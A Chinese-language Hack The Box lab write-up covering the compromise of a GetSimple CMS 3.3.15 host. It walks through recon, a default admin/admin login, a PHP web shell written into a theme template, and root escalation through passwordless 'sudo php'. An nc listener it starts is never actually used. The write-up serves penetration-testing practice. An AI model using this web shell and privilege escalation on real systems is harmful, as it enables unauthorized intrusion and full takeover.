# GetSimple CMS 3.3.15 - HTB Starting Point Writeup

**难度**: Very Easy  
**系统**: Linux  
**目标 IP**: 10.129.41.90

## 1. 信息收集

使用 nmap 进行服务扫描：

```bash
nmap -sV -sC -Pn 10.129.41.90
```

扫描结果：

22/tcp   open   ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open   http    Apache httpd 2.4.41 (Ubuntu)

访问网页后发现网站使用 GetSimple CMS 内容管理系统。

## 2.目录枚举

使用 gobuster 枚举网站目录：

```bash
gobuster dir -u http://10.129.41.90 -w /usr/share/wordlists/dirb/common.txt
```

发现关键目录 /admin，访问后出现 GetSimple CMS 登录界面。

## 3. 漏洞查找

确认 CMS 版本为 GetSimple 3.3.15 后，进行漏洞搜索：

```bash
searchsploit getsimple
```
```bash
msfconsole
search getsimple
```

找到可用 exploit：
exploit/unix/webapp/get_simple_cms_upload_exec （文件上传漏洞，Rank: excellent）

## 4. 漏洞利用

使用默认弱密码登录后台：
Username: admin
Password: admin
进入 Themes → Edit Theme，选择一个模板文件（Innovation/template.php）

```php
<?php system($_GET['cmd']); ?>
```

本地监听端口：

```bash
nc -lvnp 4444
```
在浏览器触发后门：

```text
http://10.129.41.90/theme/Innovation/template.php?cmd=whoami
```

成功获得 www-data 权限的 shell。

## 5. 权限提升
查看当前权限：

```bash
whoami
id
sudo -l
```

发现 www-data 用户可以无密码执行 /usr/bin/php，直接提权到 root：

```bash
sudo /usr/bin/php -r "system('/bin/bash');"
```

提权成功后读取 Flag：

```bash
cat /home/mrb3n/user.txt
cat /root/root.txt
```

核心利用链：
信息收集 → 发现 GetSimple CMS → 后台弱密码登录 → Theme 文件上传实现 RCE → sudo php 无密码提权到 root

### Writeup By YRww
**Keep Hacking**
